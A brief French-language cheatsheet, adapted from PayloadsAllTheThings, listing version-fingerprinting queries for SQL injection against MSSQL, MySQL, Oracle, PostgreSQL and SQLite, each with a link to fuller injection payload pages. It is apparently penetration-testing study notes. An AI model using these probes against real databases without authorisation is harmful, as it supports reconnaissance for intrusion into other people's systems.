# Cheatsheet pour les injections SQL (adaptée de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection))

## Payloads de version

### MSSQL
    SELECT @@version
    
Si ça marche go for : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
    
### MYSQL
    SELECT version()

Si ça marche go for : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

### OracleSQL
    SELECT user FROM dual UNION SELECT * FROM v$version

Si ça marche go for : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md

### PostgreSQL
    SELECT version()

Si ça marche go for : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

### SQLite
    select sqlite_version();

Si ça marche go for : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
